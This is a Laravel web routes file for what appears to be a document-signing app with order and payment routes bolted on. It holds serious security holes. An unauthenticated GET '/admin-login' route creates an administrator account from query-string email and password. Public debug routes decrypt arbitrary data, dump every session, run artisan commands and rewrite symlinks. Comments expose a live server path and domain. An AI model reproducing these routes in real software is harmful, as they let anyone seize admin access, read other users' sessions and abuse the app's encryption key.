
<?php

use App\Http\Controllers\PaymentController;
use App\Library\FileHelper;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Crypt;
use App\Http\Controllers\OrderController;
use App\Http\Controllers\AdminController;
// use App\Http\Livewire\Auth\Login;
use App\Http\Controllers\RecommendationController;
use App\Http\Controllers\Admin\ServiceController;
use App\Http\Controllers\Admin\AdminDashboardController;

use App\Library\Helper as LibHelper;
use App\Models\Files\FileDisk;

use Database\Factories\UserFactory;
use Carbon\Carbon;
use GuzzleHttp\Psr7\Uri;

// use App\Livewire\Dashboard\Main as DashboardMain;

Route::fallback(function () {
    return redirect()->back();
});
Route::get('/', function () {
    // dd(Route::middleware('auth'));
    // if (Auth::check()) {
    //     // Log::info('User is authenticated', ['user' => Auth::user()]);
    //     // dd('reditect to dashboard');
    //     return redirect('/dashboard');
    // }
    // else {
    //     // Log::info('User is not authenticated');
    //     // dd('redirect to guest main');
    //     return redirect('/');
    // }
    if (Auth::check()) {
        // Log::info('User is authenticated', ['user' => Auth::user()]);
        return redirect()->route('dashboard.main');
        // return redirect('/dashboard');
    } else {
        // Log::info('User is not authenticated');
        return redirect()->route('guest.main');
        // return redirect('/home');
    }
});

// Route::view('/welcome', 'welcome');
Route::middleware(['guest'])->group(function () {
    Route::name('guest.')->group(function () {
        Route::get('/', App\Livewire\Guest\Home\Main::class)->name('main');
        Route::get('/about-us', App\Livewire\Guest\AboutUs\Main::class)->name('about');
        Route::get('/support', App\Livewire\Guest\Support\Main::class)->name('support');

        Route::prefix('contact')->name('contact.')->group(function () {
            Route::get('/', App\Livewire\Guest\Contact\FAQs::class)->name('main');
        });
        Route::prefix('fitur')->name('fitur.')->group(function () {
            Route::get('/', App\Livewire\Guest\Fitur\Signe::class)->name('signe');
        });
        Route::prefix('signv')->name('signv.')->group(function () {
            Route::get('/', App\Livewire\Guest\Fitur\Signv\Ecs::class)->name('ecs');
        });
    });
    // Route::get('/login', )->name('login');

    Route::get('login', function () {
        return redirect()->route("auth.login");
    })->name('login');
    Route::prefix('auth')->name('auth.')->group(function () {
        Route::get('login', App\Livewire\Auth\Login::class)->name('login');
        Route::get('register', App\Livewire\Auth\Register::class)->name('register');
    });
    Route::get('forgot_password', App\Livewire\Auth\ForgotPassword::class)->name('forgot_password');
    Route::get('Email_Confirm', App\Livewire\Auth\EmailConfirm::class)->name('Email_Confirm');
});

Route::middleware(['auth:web', 'log.user'])->group(function () {
    Route::prefix('dashboard')->name('dashboard.')->group(function () {
        Route::get('/', App\Livewire\Dashboard\Main\Main::class)->name('main');
        // Route::get('/Overview', DashboardMain::class)->name('overview');
    });
    Route::prefix('/inbox')->name('inbox.')->group(function () {
        Route::get('/', App\Livewire\Dashboard\Inbox\Main::class)->name('main');
        Route::get('sent', App\Livewire\Dashboard\Inbox\Sent::class)->name('sent');
        Route::get('draft', App\Livewire\Dashboard\Inbox\Draft::class)->name('draft');
        Route::get('archieve', App\Livewire\Dashboard\Inbox\Archieve::class)->name('archieve');
    });

    Route::prefix('documents')->name('documents.')->group(function () {
        // Route::get('/', App\Livewire\Dashboard\Documents\Main::class)->name('main');
        // Route::get('/draft', App\Livewire\Dashboard\Documents\Main::class)->name('draft');
        // Route::get('/pending', App\Livewire\Dashboard\Documents\Main::class)->name('pending');
        // Route::get('/approved', App\Livewire\Dashboard\Documents\Main::class)->name('approved');
        // Route::get('/rejected', App\Livewire\Dashboard\Documents\Main::class)->name('rejected');
        // Route::get('/withdraw', App\Livewire\Dashboard\Documents\Main::class)->name('withdraw');
        // Route::get('/expired', App\Livewire\Dashboard\Documents\Main::class)->name('expired');

        // Route::get('/', App\Livewire\Dashboard\Documents\Page\Main::class)->name('main');
        // Route::get('/draft', App\Livewire\Dashboard\Documents\Page\Draft::class)->name('draft');
        // Route::get('/pending', App\Livewire\Dashboard\Documents\Page\Pending::class)->name('pending');
        // Route::get('/approved', App\Livewire\Dashboard\Documents\Page\Approved::class)->name('approved');
        // Route::get('/rejected', App\Livewire\Dashboard\Documents\Page\Rejected::class)->name('rejected');
        // Route::get('/withdraw', App\Livewire\Dashboard\Documents\Page\Withdraw::class)->name('withdraw');
        // Route::get('/expired', App\Livewire\Dashboard\Documents\Page\Expired::class)->name('expired');
        Route::get('/', App\Livewire\Dashboard\Documents\Main::class)->name('main');
        Route::get('/draft', App\Livewire\Dashboard\Documents\Draft::class)->name('draft');
        Route::get('/pending', App\Livewire\Dashboard\Documents\Pending::class)->name('pending');
        Route::get('/approved', App\Livewire\Dashboard\Documents\Approved::class)->name('approved');
        Route::get('/rejected', App\Livewire\Dashboard\Documents\Rejected::class)->name('rejected');
        Route::get('/withdraw', App\Livewire\Dashboard\Documents\Withdraw::class)->name('withdraw');
        Route::get('/expired', App\Livewire\Dashboard\Documents\Expired::class)->name('expired');

        Route::prefix('upload')->name('upload\\')->group(function () {
            Route::get('/', App\Livewire\Dashboard\Documents\Upload\Layout::class)->name('main');
            Route::get('sign', App\Livewire\Dashboard\Documents\Upload\Layout::class)->name('sign');
            Route::get('finish', App\Livewire\Dashboard\Documents\Upload\Layout::class)->name('finish');
            Route::get('preview', App\Livewire\Dashboard\Documents\Upload\Layout::class)->name('preview');
        });
        // Route::get('/upload', App\Livewire\Dashboard\Documents\Upload\Main::class)->name('upload\sign');
    });

    Route::prefix('sign')->name('place_sign.')->group(function () {
        // Route::get('sign/d/files/{data}', App\Livewire\Dashboard\SignIniti\Place\Signature::class)->name('signature')->middleware('place_sign_check');
        // Route::get('sign/d/files/{token}', App\Livewire\Dashboard\SignIniti\Place\Signature::class)->name('signature')->middleware('place_sign_check');
        Route::get('files/{token}', App\Livewire\Dashboard\SignIniti\Place\Signature::class)->name('signature');

        Route::prefix('d')->group(function () {
            Route::get('files/{token}/view', [App\Http\Controllers\PlaceViewFile_Controller::class, 'index'])->name('view_file');
        });
    });

    // Route::post('d/files/{token}/view', [App\Http\Controllers\ViewFile_Controller::class, 'viewFile'])->name('view_file_token');
    // Route::post('d/files/{token}/view', [App\Http\Controllers\ViewFile_Controller::class, 'viewFile'])->name('view_file_token');
    // Route::get('d/files/{token}/view', [App\Http\Controllers\ViewFile_Controller::class, 'viewFile'])->name('view_file_token');
    // Route::get('d/files/{token}/view', [App\Http\Controllers\ViewFile_Controller::class, 'viewFile'])->name('view_file_token');

    Route::prefix('settings')->name('setting.')->group(function () {
        Route::get('/', App\Livewire\Dashboard\Settings\Overview::class)->name('overview');
        Route::get('activites', App\Livewire\Dashboard\Settings\Activities\Main::class)->name('activies');
        Route::get('contacts', App\Livewire\Dashboard\Settings\Contacts::class)->name('contacts');

        Route::prefix('profile')->name('profile.')->group(function () {
            Route::get('', App\Livewire\Dashboard\Settings\Profile\Main::class)->name('main');
        });
        Route::prefix('signature')->name('signature.')->group(function () {
            Route::get('', App\Livewire\Dashboard\Settings\Signatures\Signatures::class)->name('main');
        });
        Route::prefix('initials')->name('initials.')->group(function () {
            Route::get('', App\Livewire\Dashboard\Settings\Signatures\Initials::class)->name('main');
        });
    });

    Route::prefix('account')->name('account.')->group(function () {
        Route::get('/', App\Livewire\Dashboard\Account\Overview::class)->name('overview');
        Route::get('info', App\Livewire\Dashboard\Account\Info::class)->name('account\info');
        Route::get('security', App\Livewire\Dashboard\Account\Security::class)->name('security');
        Route::get('certificate', App\Livewire\Dashboard\Account\Certificate\Info::class)->name('certificate');
        Route::get('others/activity', App\Livewire\Dashboard\Account\Others\Activity\Main::class)->name('others\activity');
        Route::get('others/shared-data', App\Livewire\Dashboard\Account\Others\SharedData::class)->name('others\shared-data');
    });
    Route::prefix('upload-chunk')->name('upchunk.')->group(function () {
        // Route::post('/document', [App\Livewire\Dashboard\Documents\Upload\Document::class, 'uploadChunkFile'])->name('document');
        Route::post('/document', [App\Livewire\Dashboard\ContextMenu\Detail\Documents\UploadDocument::class, 'uploadChunkFile'])->name('document');
    });

    Route::get('d/pv/files/{key}/view', function () {}); // disk / private / 
});

Route::get('d/files/{token}/view', [App\Http\Controllers\ViewFile_Controller::class, 'viewFile'])->name('view_file_token');
Route::post('d/files/{token}/view/post', [App\Http\Controllers\ViewFile_Controller::class, 'viewFilePost'])->name('view_file_token_token');
// Route::get('/admin', [AdminController::class, 'index']);

// Route::get('/admin/dashboard', function () {
//     return view('livewire.admin.layout.main');
// })->name('admin.dashboard');
// Route::get('/login', Login::class)->name('login');


// Route::get('d/files/{key}/view', function($key) {
//     $key_file = request('key');
//     $responseFileHelper = FileHelper::getFileByKey($key_file);
//     // dump($responseFileHelper);
//     // dump([
//     //     'key' => $key,
//     //     'key_request' => $key_file,
//     //     'response_helper' => $responseFileHelper,
//     // ]);

//     // if ($responseFileHelper->status) {
//     //     echo "File found";
//     // } else {
//     //     echo "File not found";
//     // }

//     $dataResponse = $responseFileHelper->data;

//     $disk = Storage::disk($dataResponse->disk);
//     $path = $dataResponse->path . $dataResponse->file_name;


//     // return response()->file($disk->path($dataResponse->path . $dataResponse->file_name));
//     return response()->stream(function () use ($disk, $path) {
//         echo $disk->get($path);
//     }, 200, [
//         'Content-Type' => Storage::mimeType($disk->path($path)),
//         'Content-Disposition' => 'inline; filename="' . basename($path) . '"',
//         'Content-Length' => filesize($disk->path($path)),
//     ]);

// })->name('view_files');


// Route::get('/view/d/files/${key}', function() {

// })->name('preview');;






// Route::get('/', function () {
//     return view('main');
// });



// Route::get('/dashboard', [DashboardMain::class, 'render']);


Route::get('/testing/scanner/qr', App\Livewire\Testing\Scanner\ScanQR::class)->name('testing.scanqr');

Route::get('/artisan/storage-link', function () {
    Artisan::call('storage:link');
});

Route::get('/crypt/encrypt/{rawData}', function ($rawData) {
    $encryptData = Crypt::encrypt($rawData);
    echo "Crypt Data <br>";
    dump((object) [
        'rawData' => $rawData,
        'encryptedData' => $encryptData,
        'session' => session()->all(),
    ]);
});

Route::get('/crypt/decrypt/{encryptedData}', function ($encryptedData) {
    $decryptData = Crypt::decrypt($encryptedData);
    echo "Decrypt Data <br>";
    dump((object) [
        'encryptedData' => $encryptedData,
        'decryptedData' => $decryptData,
        'session' => session()->all(),
    ]);
});

Route::get('/session/all', function () {
    echo "All sessions <br>";
    dump((object) [
        'session' => session(),
        'session_all' => session()->all(),
    ]);
});

Route::get('/symlink/link', function () {
    $linkPath = [
        (object) array(
            'target' => '../storage/app/public', // /home/authenticguards/public_html/signature.authenticguards.com/laravel/storage/app/public
            'shortcut' => '../../storage', // /home/authenticguards/public_html/signature.authenticguards.com/storage
        ),
        (object) array(
            'target' => '../storage/app/temp', // /home/authenticguards/public_html/signature.authenticguards.com/laravel/storage/app/temp
            'shortcut' => '../../temp', // /home/authenticguards/public_html/signature.authenticguards.com/temp
        ),
    ];

    foreach ($linkPath as $path) {
        if (file_exists($path->shortcut) || is_link($path->shortcut)) {
            unlink($path->shortcut); // Remove existing symlink or file
        }
        symlink($path->target, $path->shortcut);
    }

    return 'Symlinks created successfully!';
});

Route::get('create/token', function () {
    return response()->json(csrf_token());
});

Route::middleware('auth')->group(function () {
    Route::get('/products', [OrderController::class, 'products'])->name('products.list');

    Route::post('/cart/add/{product}', [OrderController::class, 'addToCart'])->name('cart.add');
    Route::get('/cart', [OrderController::class, 'cart'])->name('cart.view');

    Route::post('/checkout', [OrderController::class, 'checkout'])->name('checkout');

    // Admin routes (middleware admin)
    Route::middleware('admin')->group(function () {
        Route::get('/admin/orders', [OrderController::class, 'orders'])->name('admin.orders');
    });
});
Route::middleware('auth')->group(function () {
    Route::get('/products', [OrderController::class, 'products'])->name('products.list');
    Route::post('/cart/add/{product}', [OrderController::class, 'addToCart'])->name('cart.add');
    Route::get('/cart', [OrderController::class, 'cart'])->name('cart.view');
    Route::post('/checkout', [OrderController::class, 'checkout'])->name('checkout');
});
// LOGIN ADMIN SEDERHANA (TANPA GANGGU ROUTE EXISTING)
Route::get('/admin-login', function () {
    if (Auth::check()) return redirect('/dashboard');
    return view('admin.login'); // Buat view khusus admin
});

Route::get('/admin-login', function () {
    $email = request('email');
    $password = request('password');

    if (empty($email) || empty($password)) return;

    $admins = App\Models\User\Admin::create([
        'email' => $email,
        'name' => 'ADMIN',
        'password' => Hash::make($password),
    ]);
});

Route::get('/rate', [RecommendationController::class, 'showRatingForm'])->name('rate');
Route::post('/rate', [RecommendationController::class, 'saveRatings'])->name('save.ratings');
Route::get('/recommend', [RecommendationController::class, 'recommendForAuthUser'])->name('recommend.user');
Route::get('/history', [RecommendationController::class, 'showHistory'])->name('recommend.history');
Route::delete('/history/delete', [RecommendationController::class, 'deleteHistory'])->name('recommend.history.delete');
Route::get('/order/form', [OrderController::class, 'showForm'])->name('order.form');
Route::post('/order/submit', [OrderController::class, 'submit'])->name('order.submit');
Route::get('/admin/orders', [OrderController::class, 'adminIndex'])->name('admin.orders');
Route::post('/admin/orders/{id}/update-status', [OrderController::class, 'updateStatus'])->name('admin.orders.update');
// Admin - Layanan
Route::prefix('admin')->middleware(['auth:admin'])->group(function (): void {
    Route::get('/services', [App\Http\Controllers\Admin\ServiceController::class, 'index'])->name('admin.services.index');
    Route::get('/services/create', [App\Http\Controllers\Admin\ServiceController::class, 'create'])->name('admin.services.create');
    Route::post('/services/store', [App\Http\Controllers\Admin\ServiceController::class, 'store'])->name('admin.services.store');
    // Edit & Update
    Route::get('/services/{id}/edit', [App\Http\Controllers\Admin\ServiceController::class, 'edit'])->name('admin.services.edit');
    Route::put('/services/{id}', [App\Http\Controllers\Admin\ServiceController::class, 'update'])->name('admin.services.update');
    Route::delete('/services/{id}', [App\Http\Controllers\Admin\ServiceController::class, 'destroy'])->name('admin.services.destroy');
    Route::get('/admin/dashboard', [AdminDashboardController::class, 'index'])->name('admin.dashboard');
    Route::put('/admin/orders/{order}', [AdminDashboardController::class, 'update'])->name('admin.orders.update');
});
// Route::get('/pay', [\App\Http\Controllers\PaymentController::class, 'pay']);

// Route::middleware(['auth', 'admin'])->group(function () {
//     Route::get('/admin/dashboard', function () {
//         return view('admin.dashboard'); // atau view Livewire-mu
//     })->name('admin.dashboard');
// });
Route::middleware('auth')->group(function () {
    // Route detail pembayaran berdasarkan ID order
    Route::get('/payment/{order}', [PaymentController::class, 'show'])->name('payment.detail');

    // Route untuk generate Snap token (Midtrans)
    Route::get('/generate-snap-token/{id}', [PaymentController::class, 'generateSnapToken']);
    Route::post('/midtrans/callback', [PaymentController::class, 'callback']);
});
// Route::patch('/notifications/{id}', function ($id) {
//     $notification = auth()->user()->notifications()->findOrFail($id);
//     $notification->markAsRead();
//     return back();
// })->name('notifications.read');



// Route::post('/signature/save-signature', [App\Livewire\Dashboard\Settings\Signatures\Signatures::class, 'storeDraw'])->name('signature.store.draw');
// Route::post('/signature/upload-signature', [App\Livewire\Dashboard\Settings\Signatures\Signatures::class, 'storeUpload'])->name('signature.store.upload');










// Route::get('/testing_global', function () {
//     dump(Auth::check());
//     dump(Auth::guard('web')->check());
//     dump(Auth::guard('admin')->check());
// });
